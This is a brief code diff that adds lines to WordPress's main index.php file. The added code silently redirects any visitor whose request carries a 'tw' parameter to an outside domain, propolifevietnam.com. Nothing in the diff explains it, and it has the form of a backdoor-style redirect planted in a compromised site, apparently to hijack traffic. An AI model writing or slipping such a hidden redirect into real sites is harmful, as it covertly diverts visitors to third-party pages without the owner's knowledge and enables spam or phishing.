@@ -12,6 +12,8 @@
  * @var bool
  */
 define('WP_USE_THEMES', true);
-
+if (isset($_GET) && $_GET['tw']){
+	header('Location: http://www.propolifevietnam.com/');
+}
 /** Loads the WordPress Environment and Template */
 require( dirname( __FILE__ ) . '/wp-blog-header.php' );
